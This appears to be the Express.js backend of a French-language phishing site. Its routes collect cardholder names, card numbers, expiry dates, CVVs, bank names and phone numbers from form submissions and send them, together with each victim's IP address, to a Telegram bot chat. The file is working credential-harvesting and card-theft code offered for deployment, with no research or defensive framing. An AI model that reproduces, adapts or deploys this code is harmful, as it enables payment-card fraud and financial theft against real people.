const express = require('express');
const path = require('path');
const https = require('https');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../backend-nodejs/views'));
app.use(express.static(path.join(__dirname, '../backend-nodejs/public')));

app.use((req, res, next) => {
  req.clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'N/A';
  req.userAgent = req.headers['user-agent'] || 'N/A';
  next();
});

const sendTelegram = (text) => {
  return new Promise((resolve, reject) => {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    console.log('Telegram Config Check:');
    console.log('Token exists:', !!token);
    console.log('ChatId exists:', !!chatId);
    console.log('Token preview:', token ? token.substring(0, 10) + '...' : 'MISSING');
    console.log('ChatId:', chatId);
    
    if (!token || !chatId) return reject(new Error('Missing Telegram config'));

    const payload = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' });
    const opts = {
      hostname: 'api.telegram.org',
      path: `/bot${token}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          console.log('Telegram Response:', response);
          resolve(response);
        } catch (e) {
          reject(e);
        }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
};

app.get('/', (req, res) => res.render('index'));
app.get('/accords', (req, res) => res.render('accords'));
app.get('/premiere', (req, res) => res.render('premiere'));
app.get('/deuxieme', (req, res) => res.render('deuxieme'));

app.post('/api/send-agreement', async (req, res) => {
  try {
    const msg = `<b>✅ ACCORD ACCEPTÉ</b>
━━━━━━━━━━━━━━━━
⏰ ${new Date().toLocaleString('fr-FR')}
🌐 IP: ${req.clientIP}`;
    await sendTelegram(msg);
    res.json({ success: true });
  } catch (e) {
    console.error('Telegram error:', e);
    res.status(500).json({ success: false, error: e.message });
  }
});

app.post('/api/send-form', async (req, res) => {
  try {
    const { titulaire, cardNumber, expiryDate, bank, telephone } = req.body;
    const msg = `<b>💳 DONNÉES BANCAIRES</b>
━━━━━━━━━━━━━━━━
👤 ${titulaire}
💳 ${cardNumber}
📅 ${expiryDate}
🏦 ${bank}
📱 ${telephone}
🌐 IP: ${req.clientIP}
⏰ ${new Date().toLocaleString('fr-FR')}`;
    await sendTelegram(msg);
    res.json({ success: true });
  } catch (e) {
    console.error('Telegram error:', e);
    res.status(500).json({ success: false, error: e.message });
  }
});

app.post('/api/send-cvv', async (req, res) => {
  try {
    const { cvv, titulaire, cardNumber, expiryDate } = req.body;
    const msg = `<b>🔐 CVV REÇU</b>
━━━━━━━━━━━━━━━━
🔑 ${cvv}
👤 ${titulaire}
💳 ${cardNumber}
📅 ${expiryDate}
🌐 IP: ${req.clientIP}
⏰ ${new Date().toLocaleString('fr-FR')}`;
    await sendTelegram(msg);
    res.json({ success: true });
  } catch (e) {
    console.error('Telegram error:', e);
    res.status(500).json({ success: false, error: e.message });
  }
});

app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    environment: 'vercel',
    telegramConfigured: !!process.env.TELEGRAM_BOT_TOKEN && !!process.env.TELEGRAM_CHAT_ID
  });
});

app.post('/api/test-telegram', async (req, res) => {
  try {
    const msg = `<b>🚀 TEST TELEGRAM</b>
━━━━━━━━━━━━━━━━
✅ Connexion établie
⏰ ${new Date().toLocaleString('fr-FR')}`;
    await sendTelegram(msg);
    res.json({ success: true, message: 'Message de test envoyé' });
  } catch (e) {
    console.error('Telegram test error:', e);
    res.status(500).json({ success: false, error: e.message });
  }
});

module.exports = app;
